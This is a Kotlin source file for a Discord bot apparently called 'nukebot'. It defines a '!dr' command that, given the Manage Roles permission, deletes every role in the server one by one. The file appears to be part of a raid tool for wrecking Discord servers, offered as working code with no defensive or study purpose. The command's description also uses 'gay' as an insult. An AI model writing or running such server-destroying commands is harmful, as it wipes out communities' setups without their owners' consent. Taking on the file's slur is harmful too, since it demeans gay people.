package thenano.nukebot.bot.command.commands

import net.dv8tion.jda.api.Permission
import net.dv8tion.jda.api.events.message.MessageReceivedEvent
import thenano.nukebot.bot.command.CommandListener
import thenano.nukebot.bot.command.CommandManager

@CommandListener.Info("!dr","delete All gay role in this server",false)
class DeleteRole : CommandListener() {


    override fun onEvent(event: MessageReceivedEvent) {
        if (onInit(event)) return
        if (messageRaw.startsWith("!dr")) {
            if (self.hasPermission(Permission.MANAGE_ROLES)) {
                try {
                    message.reply("Deleting Roles")
                    for (role in guild.roles) {
                        role.delete().complete()
                        println("Deleted Role { name=" + role.name + " }")
                        if (CommandManager.stop) {
                            break
                        }
                    }
                } catch (e: StringIndexOutOfBoundsException) {
                }
            } else {
                message.reply("Missing Permission - ManageRoles").queue()
                message.delete().queue()
            }
        }
    }
}